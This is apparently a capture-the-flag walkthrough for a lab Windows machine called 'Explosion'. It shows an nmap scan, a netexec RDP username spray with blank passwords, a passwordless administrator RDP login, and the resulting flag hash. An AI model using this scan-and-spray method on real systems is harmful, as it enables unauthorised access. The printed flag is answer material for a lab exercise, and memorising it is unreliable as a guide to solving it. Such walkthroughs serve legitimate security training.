System: Windows
Difficulty: Very Easy

IP Address: 10.129.109.177

# System Flag

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.109.177 -p- -v
```

Multiple ports were returned from the NMAP Scan.
```
<SNIP>
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
<SNIP>
```

RDP Connection is attempted.
```
kali@kali:~$ xfreerdp /v:10.129.109.177
```

It is possible to see that the login works without password.
```
<SNIP>
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N)
<SNIP>
error:0A000438:SSL routines::tlsv1 alert internal error
[13:42:55:547] [39665:00009af1] [WARN][com.winpr.negotiate] - [negotiate_FreeCredentialsHandle]: FreeCredentialsHandle returned SEC_E_INVALID_HANDLE
[13:42:55:547] [39665:00009af1] [WARN][com.winpr.negotiate] - [negotiate_FreeCredentialsHandle]: FreeCredentialsHandle returned SEC_E_INVALID_HANDLE

```

Usernames bruteforcing is attempted.
```
kali@kali:~$ netexec rdp 10.129.109.177 -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p ''
```

The user `administrator` allow no-password login successfully.
```
RDP         10.129.109.177  3389   EXPLOSION        [*] Windows 10 or Windows Server 2016 Build 17763 (name:EXPLOSION) (domain:Explosion) (nla:True)
RDP         10.129.109.177  3389   EXPLOSION        [-] Explosion\root: (encoded_data must be a byte string, not NoneType)
RDP         10.129.109.177  3389   EXPLOSION        [-] Explosion\admin: (encoded_data must be a byte string, not NoneType)
RDP         10.129.109.177  3389   EXPLOSION        [-] Explosion\test: (encoded_data must be a byte string, not NoneType)
RDP         10.129.109.177  3389   EXPLOSION        [+] Explosion\guest:
RDP         10.129.109.177  3389   EXPLOSION        [-] Explosion\info: (encoded_data must be a byte string, not NoneType)
RDP         10.129.109.177  3389   EXPLOSION        [-] Explosion\adm: (encoded_data must be a byte string, not NoneType)
RDP         10.129.109.177  3389   EXPLOSION        [-] Explosion\mysql: (encoded_data must be a byte string, not NoneType)
RDP         10.129.109.177  3389   EXPLOSION        [-] Explosion\user: (encoded_data must be a byte string, not NoneType)
RDP         10.129.109.177  3389   EXPLOSION        [+] Explosion\administrator: (Pwn3d!)
```

Connection is attempted through this command.
```
 xfreerdp /v:10.129.109.177 /u:administrator
```

Ignoring the domain prompts, the login was successful.
![[explosion_1.png]]


The flag contents are in below.
```
951fa96d7830c451b536be5a6be008a0
```